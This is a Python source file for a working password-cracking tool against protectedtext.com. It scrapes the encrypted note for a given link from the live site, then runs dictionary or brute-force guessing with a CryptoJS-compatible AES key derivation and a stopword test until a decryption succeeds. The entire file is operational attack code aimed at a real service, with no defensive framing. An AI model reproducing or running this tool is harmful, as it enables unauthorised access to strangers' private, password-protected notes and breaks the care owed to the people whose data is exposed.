from Crypto.Cipher       import AES
from Crypto.Util.Padding import unpad
from Crypto.Hash         import MD5
from base64              import b64decode
from bs4                 import BeautifulSoup
from threading           import Thread
from queue               import Queue
from functools           import wraps
from control.args        import Args

from wordlists.hardcoded import STOPWORDS, TOP100
from itertools           import product
from string              import ascii_lowercase, \
                                ascii_uppercase, \
                                ascii_letters,   \
                                digits,          \
                                punctuation,     \
                                whitespace

import requests, re, os

def main():
    args = Args()
    args.process()

    kvArgs     = args.dct_args
    siteLink   = kvArgs.get('link')
    dictionary = kvArgs.get('dictionary')
    bruteforce = kvArgs.get('bruteforce')
    verbose    = kvArgs.get('verbose')

    pt         = ProtectedText(siteLink, verbose)
    ciphertext = pt.ciphertext

    if not ciphertext:
        print(f"[!] {siteLink} hasn't been created yet.")
        return

    if dictionary:
        pt.dictionary_attack(ciphertext, dictionary)

    if bruteforce:
        minKeyLen, maxKeyLen = bruteforce

        def select(x):
            return {
                0 : digits,
                1 : ascii_lowercase,
                2 : ascii_uppercase,
                3 : ascii_letters,

                4 : ascii_lowercase + digits,
                5 : ascii_uppercase + digits,
                6 : ascii_letters   + digits,

                7 : ascii_letters + digits + punctuation,
                8 : ascii_letters + digits + punctuation + ' ',
                9 : ascii_letters + digits + punctuation + whitespace[:-2]
            }.get(x)

        choice       = kvArgs.get('character_set')
        characterSet = select(choice)
        pt.bruteforce_attack(ciphertext, characterSet, minKeyLen, maxKeyLen)

def ctrl_c(function):
    @wraps(function)
    def handler(*args, **kwargs):
        return function(*args, **kwargs)
    
    def handle_ctrl_c():
        try:
            input()
        except EOFError:
            print("ctrl+c")
            os._exit(1)
    
    Thread(target=handle_ctrl_c).start()
    return handler

class Utility:
    @staticmethod
    def _wordlist(filePath):
        filePath = os.path.expanduser(
            os.path.expandvars(filePath)
        )
        
        if not os.path.isfile(filePath):
            print("Invalid wordlist!")
            return False

        with open(filePath, 'r') as f:
            internal = ""
            while True:
                buffer = f.read(1024)
                # bufLen = len(buffer)

                if not buffer:
                    break

                internal += buffer
            
            return internal.split()

    @staticmethod
    def _queueList(words):
        q = Queue()
        for word in words:
            q.put(word)

        return q

    @staticmethod
    def _detect_text(decrypted):
        # test decrypted data
        for stop in STOPWORDS:
            if stop in decrypted:
                return True
        return False

class Decryption:
    def _decrypt(self, password, ciphertext):
        try:
            decoded    = b64decode(ciphertext)
            salt       = decoded[8:16]
            ciphertext = decoded[16:]
            key, iv    = self._key_derivation_evp(password, salt)
            decipher   = AES.new(key, AES.MODE_CBC, iv)
            decrypted  = decipher.decrypt(ciphertext)
            unpadded   = unpad(decrypted, AES.block_size)
            plaintext  = unpadded[:-128] #SHA512 (128-bytes)
            return plaintext.decode('utf-8')
        except:
            pass

    @staticmethod
    def _key_derivation_evp(password, salt, keySize=8, ivSize=4, iterations=1, hashAlgorithm=MD5):
        """
        If the total key and IV length is less than the digest length and MD5 is used then the derivation algorithm is compatible with PKCS#5 v1.5 otherwise a non standard extension is used to derive the extra data. 
        https://www.openssl.org/docs/manmaster/man3/EVP_BytesToKey.html
        https://github.com/CryptoStore/crypto-js/blob/3.1.2/src/evpkdf.js
        https://gist.github.com/adrianlzt/d5c9657e205b57f687f528a5ac59fe0e
        """
        targetKeySize     = keySize + ivSize
        derivedBytes      = b""
        derivedWordsCount = 0
        block             = None
        hasher            = hashAlgorithm.new()
        while derivedWordsCount < targetKeySize:
            if block: 
                hasher.update(block)

            hasher.update(password)
            hasher.update(salt)
            block  = hasher.digest()
            hasher = hashAlgorithm.new()

            for _ in range(1, iterations):
                hasher.update(block)
                block  = hasher.digest()
                hasher = hashAlgorithm.new()

            derivedBytes += block[: min(len(block), (targetKeySize - derivedWordsCount) * 4)]

            derivedWordsCount += len(block) / 4

        # Password & IV Tuple
        return derivedBytes[0: keySize * 4], derivedBytes[keySize * 4:]

class ProtectedText(Utility, Decryption):
    def __init__(self, link, verbose):
        self.__link    = link
        self.__url     = "https://www.protectedtext.com/" + link
        self.__verbose = verbose

    @property
    def ciphertext(self):
        page = requests.get(self.__url)
        if not page.ok:
            return None

        soup    = BeautifulSoup(page.text, "html.parser")
        scripts = soup.find_all('script')
        for script in scripts:
            scriptString = str(script)
            if "ClientState" in scriptString:
                try:
                    regex = re.search(rf'"/{self.__link}",\s+"(.+)"', scriptString, re.I)
                    return bytes(regex.group(1), "utf-8")
                except AttributeError:
                    return None

    @ctrl_c
    def dictionary_attack(self, ciphertext, dictionary=None, hybrid=False):
        print(f"[*] Dictionary Attack:\n\n{ciphertext}\n")

        dictionary = self._wordlist(dictionary) if dictionary else TOP100
        dictSize10 = len(dictionary) * 0.1
        show       = dictSize10 if dictSize10 < 1000 else 1000

        for c, password in enumerate(dictionary):
            bytesPass = bytes(password, 'utf-8')
            decrypted = self._decrypt(bytesPass, ciphertext)

            if not decrypted:
                if self.__verbose:
                    print(f"[Attempt] <{c}> password: {password}")
                elif c % show == 0 and c != 0:
                    print(f"[Attempt] <{c}> password: {password}")
                continue

            if self._detect_text(decrypted):
                print(f"[!!!!!!!] password: {password}")
                return password, decrypted

        print("Password Not Found! Press Enter or Ctrl+C to Exit ...")

    @ctrl_c
    def bruteforce_attack(self, ciphertext, characterSet, minKeyLen=1, maxKeyLen=6):
        print(f"[*] Bruteforce Attack:\n\n{ciphertext}\n")

        c = 0
        for r in range(minKeyLen, maxKeyLen+1):
            for password in product(characterSet, repeat=r):
                c+=1
                # if password[0] != 'p' or password[1] != 'x':
                #     continue
                password  = ''.join(password)
                bytesPass = bytes(password, 'utf-8')
                decrypted = self._decrypt(bytesPass, ciphertext)

                if not decrypted:
                    if self.__verbose:
                        print(f"[Attempt] <{c}> password: {password}")
                    elif c % 1000 == 0 and c != 0:
                        print(f"[Attempt] <{c}> password: {password}")
                    continue

                if self._detect_text(decrypted):
                    print(f"[!!!!!!!] password: {password}")
                    return password, decrypted

        print("Password Not Found! Press Enter or Ctrl+C to Exit ...")

if __name__ == "__main__":
    main()
    os._exit(1)